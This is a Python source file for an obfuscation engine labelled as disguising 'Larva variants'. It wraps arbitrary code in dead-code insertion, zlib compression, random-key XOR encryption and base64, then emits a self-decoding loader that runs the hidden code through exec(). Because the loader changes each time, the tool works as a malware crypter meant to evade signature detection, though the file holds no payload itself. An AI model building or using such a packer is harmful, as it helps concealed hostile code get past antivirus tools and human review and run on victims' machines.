import ast
import base64
import zlib
import random
import string
import os
from typing import Optional

class ObfuscationEngine:
    """
    5-Layer Obfuscation for Larva Variants.
    """
    def __init__(self):
        pass

    def obfuscate(self, source_code: str) -> str:
        # Layer 1: Source AST (Variable Renaming - Simplified)
        l1 = self._layer_source(source_code)

        # Layer 2: Packing (Compression)
        l2 = self._layer_pack(l1)

        # Layer 3: Encryption (XOR for prototype, AES in full impl)
        key = random.randint(1, 255)
        l3 = self._layer_encrypt(l2, key)

        # Layer 4: Encoding (Base64)
        l4 = self._layer_encode(l3)

        # Layer 5: Polymorphism (Loader generation)
        l5 = self._layer_polymorph(l4, key)

        return l5

    def _layer_source(self, code: str) -> str:
        # Insert dead code
        dead_code = f"\n# Random ID: {random.randint(0, 99999)}\n"
        return dead_code + code

    def _layer_pack(self, code: str) -> bytes:
        return zlib.compress(code.encode())

    def _layer_encrypt(self, data: bytes, key: int) -> bytes:
        # Simple XOR
        return bytes([b ^ key for b in data])

    def _layer_encode(self, data: bytes) -> str:
        return base64.b64encode(data).decode()

    def _layer_polymorph(self, encoded: str, key: int) -> str:
        # Generate a python loader script
        loader = f"""
import zlib, base64
k = {key}
e = "{encoded}"
d = base64.b64decode(e)
x = bytes([b ^ k for b in d])
exec(zlib.decompress(x).decode())
"""
        return loader
